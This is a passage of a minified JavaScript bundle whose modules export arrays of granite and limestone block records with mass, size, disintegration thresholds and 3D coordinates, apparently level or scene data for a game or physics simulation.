5566154649205},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:137.3791222687194,y:6.360891569166018,z:-590.7544930527546},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:86.07301900937767,y:6.271091858132411,z:-613.9150940901418},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:158.38688935056663,y:6.397822475072471,z:-576.3215370331947},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:167.02484419616306,y:6.362536610242915,z:-595.3736201966854},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:187.5788557159177,y:6.4647021815204635,z:-548.6232001993397},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:196.7290378899225,y:6.450272381291554,z:-552.4187879610989},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:165.75937348867197,y:8.169724638980371,z:-557.0867037244517},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:185.88196593407537,y:6.428491596372749,z:-572.3830929180572},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:158.49492814735768,y:6.46532653414654,z:-565.9295493212751},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:174.52655693782606,y:6.452408209442916,z:-584.1409497798462},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:208.87438545599366,y:6.205767529618128,z:-592.1240311924015},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:196.2538157432827,y:6.320646777013167,z:-589.3904865312735},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:198.01118613546592,y:6.516182551900214,z:-599.0339243240181},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:213.8090411286072,y:7.492705928078518,z:-608.9877091440661},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:175.10093020822026,y:6.031112613056398,z:-649.3828795013078},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:207.2155717305056,y:8.726186056033109,z:-616.3053910294486},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:229.2673062649393,y:6.454654489854074,z:-594.2660270724444},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:240.72027901569243,y:6.430152094299507,z:-583.0244935603952},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:277.8998307315414,y:6.421418836650589,z:-536.8924071490397},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:205.16728897208984,y:9.787086286639719,z:-582.9020648781915},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:234.36225897533495,y:6.397373411627778,z:-565.9833749131033},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:274.0580443215755,y:6.487210924503508,z:-508.93257138665575},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:166.64515500442803,y:6.478362213110898,z:-623.6161265384502},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:203.08095332257724,y:6.1466221942164125,z:-607.5941157640642},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:228.49259257656516,y:11.821642990458699,z:-602.5973567472283},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:199.96249474967917,y:15.139766745724724,z:-612.0801042011801},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:208.9333985227817,y:10.829050538636958,z:-600.9297424288529},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:220.30490761369944,y:6.4851406485688585,z:-601.5529329501112},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:125.10311793348214,y:6.414461624331302,z:-601.3258862726049},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:152.30689431808932,y:6.242795577451469,z:-662.8237499391643},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:185.76209705635608,y:11.244495377890345,z:-581.1384548099297},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:200.59383984428837,y:15.504431882679096,z:-602.1071190565793},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:114.85600915149344,y:6.486024912414917,z:-525.426055208825},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:183.54959179637612,y:6.4540433994880155,z:-562.554373416583},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:199.5195144071744,y:13.708612523185131,z:-574.1322916505303},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:202.34397216777032,y:13.741113972516564,z:-592.174880439475},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:123.51478235828112,y:6.484808758858127,z:-496.6615677265498},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:179.95044657254982,y:9.492999013039936,z:-543.0552392063793},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:219.64933856923233,y:8.776905014083198,z:-567.4550734167938},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:135.29075305270354,y:6.307257999281347,z:-475.98669091222166},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:161.67867180355267,y:6.460099350819854,z:-526.5264573899833},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:207.2620913439192,y:6.244054882259218,z:-546.8405768542066},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:230.5253733451583,y:6.197984651016624,z:-512.1243215218483},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:244.45757393577162,y:6.44021693585869,z:-514.8260242560613},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:211.90417708676156,y:6.27111470758258,z:-538.1032654397266},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:177.05615940836665,y:6.306116426106612,z:-458.6828970269851},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:210.547462610165,y:14.894269684348963,z:-550.4373936138678},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:228.0926067565869,y:12.55035614215833,z:-570.7477151838309},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:254.12582643152746,y:6.170906422078089,z:-503.7918145925711},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:222.05496444973852,y:6.483931744591233,z:-525.2655569074473},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:223.99188647893266,y:9.871061715598826,z:-534.275010763399},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:220.28296798933974,y:7.205908073582121,z:-543.1621121064811},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:238.55198414212123,y:6.0325375035787765,z:-505.1105894458023},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:232.81368364816245,y:6.284690282579421,z:-525.8554479556188},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:244.6591468982307,y:6.430279324559127,z:-549.3878335112307},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:255.1750462217278,y:10.903668895093038,z:-577.8578035791879},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:189.5414975213526,y:11.750756978767669,z:-556.8412663175292},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:195.63397436205813,y:6.57698890360369,z:-562.8184539895354},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:194.80187388542862,y:14.602961782701401,z:-583.9987640590032},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:208.20154704231072,y:17.65846141741611,z:-577.0178853705321},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:220.08310395785364,y:12.965254257288795,z:-552.495744126211},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:275.394479071152,y:6.32110949084027,z:-522.1095306776215}];
},{}],197:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:278.95975915459917,y:4.143095576501042,z:-455.53513895016044},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:272.3639783742082,y:4.389000213707589,z:-532.5516236681727},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:282.0781668109568,y:4.401160743780082,z:-507.0690556343733},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:246.11516946228687,y:4.1177686697309,z:-469.9076292726112},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:216.14207974665248,y:6.294444651020028,z:-547.5759475697002},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:274.3796075821884,y:4.278763504076861,z:-425.08123838289185},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:228.6219475344501,y:4.4666721770964575,z:-519.2954203343238},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:254.33977267404586,y:4.433841385773016,z:-535.5230250357191},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:226.54660635508534,y:4.362836304735984,z:-534.6506995386388},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:243.20627714375598,y:4.2658567663143785,z:-505.7743960249213},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:127.64167447536676,y:4.161327476657636,z:-459.6971301507728},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:273.81130836041785,y:4.476536638452175,z:-544.082729924369},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:299.939059259683,y:4.419831764185643,z:-452.44699194787677},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:226.9075306005615,y:6.297639750568947,z:-563.1363580527676},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:220.91749671827014,y:4.455831941157207,z:-525.9664244804532},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:219.04140075127714,y:4.499736428724107,z:-516.1773665265445},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:184.6034902590859,y:6.459727345411256,z:-548.8009391853071},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:252.10845112782206,y:4.400620933518269,z:-547.7921743552329},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:150.31954819217916,y:4.173354977297981,z:-607.1201737501391},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:126.86484960528645,y:4.3682616184251675,z:-638.7912547358455},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:297.0973595596863,y:9.497300135138023,z:-530.1225135224458},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:240.03118210323606,y:10.3632788497193,z:-554.2544153827946},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:160.5736027883863,y:11.223450055231472,z:-572.714545930529},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:202.0737470114062,y:11.252105080399065,z:-545.9935479348235},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:299.8685703942327,y:9.284902574716455,z:-386.754737099893},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:172.34476589399395,y:11.493193977041273,z:-556.5799025306898},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:91.0304151297677,y:9.42222821914155,z:-646.7644199132658},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:195.82591004101613,y:9.2045154486805,z:-743.9215695860527},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:202.79914734762377,y:11.33482255500724,z:-614.1383754767511},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:132.11799708020163,y:9.435490780352602,z:-550.2190640247834},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:91.28630875039188,y:9.336212131295877,z:-547.1141440847265},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:93.04358581942782,y:9.244736553884447,z:-585.31506969352},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:192.8301981441237,y:21.187592091760283,z:-566.9857120587723},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:220.53662247996414,y:16.487684732338447,z:-594.3438107280589}];
},{}],198:[function(require,module,exports){
module.exports=[{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:186.7986356710222,y:20.53304402895758,z:-573.8078340874755},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:210.36472759102102,y:20.197851825374,z:-552.8690129327725},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:211.26256975871271,y:16.379796311831182,z:-596.0577325492548},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:233.61963183126372,y:16.48122703512148,z:-575.9266870428293},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:181.36815758120565,y:20.75373620544371,z:-544.6897420231304},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:157.37091918825286,y:18.760852576144547,z:-568.3100973610728},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:243.58204929659175,y:14.391249302377343,z:-478.5103743405477},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:172.2985848916583,y:43.790863699369545,z:-561.616053733815},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:213.5196295193214,y:38.746968954802576,z:-576.2173149012721},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:201.57648108333618,y:11.397226657269588,z:-531.4803818843244},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:164.68707320875075,y:9.49065238719112,z:-634.5610070782774},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:132.01664215663075,y:9.402235842516404,z:-590.3620123411974},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:152.74443257897,y:9.29116550374488,z:-655.157078121864},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:184.10212081590797,y:9.874612996820426,z:-642.3068747005519},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:218.28487611347285,y:9.435083122580899,z:-476.1402509714493},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:169.21539240472862,y:6.26579787480404,z:-578.2386940786128},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:156.45377525316488,y:4.4435455369891725,z:-592.5034076824617},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:179.37591536051278,y:4.334409989181961,z:-655.3179636658167},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:191.2663392682148,y:6.365349364115593,z:-609.4140558960985},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:198.29773704936542,y:35.935691983579865,z:-563.5604361257579},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:179.44283821785046,y:4.3129023447214125,z:-629.5099161023983},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:188.8678166962773,y:4.686257839369619,z:-626.7284883236473},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:272.5594372281291,y:4.419976716535526,z:-662.4364640190239},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:193.4111411864297,y:29.7043197981578,z:-557.5239323096142},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:344.40502613102205,y:13.212803136748585,z:-547.3260883791695},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:223.73279709927462,y:4.4848100851481405,z:-671.425652557684},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:315.0777973098646,y:12.419391437834985,z:-659.9161119918373},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:270.7812091793545,y:4.369452939970539,z:-672.5184214480093},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:310.6001257626314,y:4.478783167687108,z:-608.4851661357153},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:187.53903094408733,y:6.336663784459979,z:-599.4793104190207},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:307.1984166623126,y:5.578394479360737,z:-505.6670583162358},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:286.6539888396592,y:4.441474800569813,z:-657.9150149025191},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:296.0357571479914,y:4.473873956251985,z:-647.2554807142243}];
},{}],199:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:471.0174930927403,y:10.499705563705417,z:-1180.7824516247736},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:450.91186096903175,y:15.482664798962828,z:-1155.8238018119368},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:489.85366102577234,y:10.496444104745548,z:-1174.1090980530146},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:457.39633902825005,y:19.044814176821944,z:-1103.0660582270307},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:475.1974079163374,y:10.488554447424086,z:-1134.7308432203374},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:500.4584246531836,y:12.80769898718311,z:-1184.3109186830015},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:503.9728170192703,y:6.4065971226983764,z:-1171.4573920490725},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:499.4461168028334,y:5.349474832608531,z:-1162.660954485658},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:484.37338560127074,y:15.296175621045549,z:-1187.3229761317755},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:529.9175677005367,y:5.3930919205555945,z:-1184.6383741302975},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:509.5025267571152,y:5.455954068033594,z:-1159.7017375713067},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:459.9221713390376,y:5.458801878406374,z:-1127.3485805278635},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:458.5558302751276,y:4.993935496653673,z:-1116.184896457621},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:453.1709883053185,y:5.474499440601247,z:-1138.1332333875582},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:450.7703128068662,y:5.4772478390512465,z:-1122.4374830820007},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:479.7357213324348,y:5.4813419160593355,z:-1197.1963766623287},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:483.2950426121255,y:5.451883082612415,z:-1187.5240617094114},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:478.3104266207215,y:10.613836953447715,z:-1205.6333970677174},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:508.12578767805905,y:5.488542419286099,z:-1232.1628046338722},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:467.26655408379696,y:8.656260993259716,z:-1195.1645716866815},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:475.43555701377807,y:14.253223385437682,z:-1195.6064107377729},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:456.0067085433085,y:5.192146442883916,z:-1183.0925456574798},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:466.5973081372159,y:5.346923041708336,z:-1166.4972810723616},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:459.154724227881,y:12.910995641264744,z:-1189.586422352594},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:480.4256455697814,y:5.129279721421227,z:-1163.413692092857},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:465.2659810816946,y:18.25751850378037,z:-1196.7952639435634},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:476.91565822244615,y:13.453032637457241,z:-1167.3438444749484},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:489.42665568890334,y:5.4521668625298965,z:-1149.3553312388458},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:476.4107930016386,y:5.235183480779672,z:-1153.5680357591984},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:489.7963474558499,y:5.418497488591054,z:-1160.0267968484457},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:500.0690988929872,y:5.340044136680259,z:-1152.7097920214671},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:515.2314061574087,y:11.513338291442803,z:-1165.190880075936},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:508.738722843844,y:10.026591715910126,z:-1151.0924620867404},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:488.7910115531736,y:5.501993358484766,z:-1138.4738168183674},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:469.22057377231,y:5.378515168399948,z:-1121.9845318673329},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:452.4412818512096,y:6.158947508565752,z:-1108.553910448846},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:482.6019671888651,y:12.567831187793729,z:-1150.783905311709},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:452.991064149001,y:11.886842100363609,z:-1129.752839216366},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:445.0331522704813,y:8.32043637367062,z:-1114.8523936872411},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:505.34228001166184,y:13.223126871288809,z:-1164.4021707322056},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:498.7367559073522,y:8.544594171062341,z:-1143.4989975442927},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:491.9107423243256,y:13.070595991311091,z:-1132.7478750519394},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:493.8627091884893,y:12.671958306617418,z:-1154.658548426757},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:521.0982914905574,y:-.7298650400677537,z:-1112.9925019925754},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:490.3052057326259,y:13.604284267194307,z:-1144.0892482582178},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:487.75710773440244,y:11.039868048330902,z:-1195.6760115231252},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:550.9498669331865,y:5.435797543365031,z:-1207.635306908746},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:484.37227586013955,y:13.802977735373284,z:-1160.4233364720715},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:501.29555721346304,y:16.38018412807139,z:-1149.1341833410836},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:448.1263721419487,y:9.905062828595582,z:-1178.8711823209883},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:461.91491144171187,y:20.404021873135992,z:-1174.1285713788725},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:470.855617239127,y:10.915260260382322,z:-1159.4074451072174},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:476.3612994787853,y:11.976427168867591,z:-1119.677362500715},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:443.72584619642066,y:5.33632852715795,z:-1171.4919036448375},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:467.3348216022474,y:15.943993977549912,z:-1167.2175046403881},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:466.1209930675388,y:5.240304092574929,z:-1148.1610448836748},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:435.8580820492479,y:10.394403405472945,z:-1167.927310866834},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:450.0818059639305,y:20.490344254697458,z:-1184.131984097081},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:462.082604463093,y:13.376118302984402,z:-1120.232960578259},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:422.9340695200744,y:5.558020578068483,z:-1143.352882811233},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:429.7100156161245,y:5.494254249573506,z:-1135.1138397158734},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:437.6870884114636,y:5.2897225561150725,z:-1127.2052208225057},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:441.28371261025575,y:15.504960637367585,z:-1174.5775724024404},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:421.0833775380313,y:12.179734866115673,z:-1155.428406131464},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:465.6536717515092,y:18.455727150386796,z:-1143.0952225161134},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:427.7490460425221,y:5.496376405713203,z:-1151.9374019734355},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:433.92142826953625,y:5.201625413407541,z:-1144.057101906283},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:430.99859836763443,y:12.277878605324977,z:-1125.5386300599546},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:447.4052007523528,y:16.880991884567294,z:-1136.3071293902997},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:430.644170291452,y:5.101519390554017,z:-1161.3730756355196},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:440.65228047493486,y:9.993446432481845,z:-1138.8848501242442},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:440.28570201950504,y:14.483675347075172,z:-1130.038058151908},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:469.35812777671526,y:14.637247781712166,z:-1112.864804668569},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:456.7896689239954,y:14.445749759790735,z:-1180.0057660682835},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:480.2722178838355,y:21.68257777912179,z:-1175.1377843617918},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:470.11716690824767,y:20.510451683230706,z:-1158.0363260853383},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:472.15307736520657,y:13.040023459273373,z:-1149.135704762411},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:460.37675485294375,y:12.2037769871486,z:-1137.4550250926},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:439.03082940842734,y:13.999774242093752,z:-1120.1492460352035}];
},{}],200:[function(require,module,exports){
